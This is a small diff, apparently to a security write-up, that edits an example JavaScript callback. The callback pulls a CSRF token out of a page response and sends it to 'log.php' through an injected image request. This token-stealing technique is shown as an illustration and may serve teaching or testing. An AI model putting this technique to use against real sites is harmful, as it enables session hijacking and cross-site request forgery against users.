@@ -24,11 +24,10 @@ Can become something like:
 'callback': function (data) {
   var response = data.match('csrf value=(.*)>');
   if(response != null) {
-    var img = document.createElement("img");
-    img.src = "log.php?response=" + escape(JSON.parse(response));
+    var img = document.createElement('img');
+    img.src = 'log.php?response=' + escape(JSON.parse(response));
     
-    var src = document.getElementById("header");
-    src.appendChild(img);
+    document.getElementById('dump').appendChild(img);
   }
 }
 ```
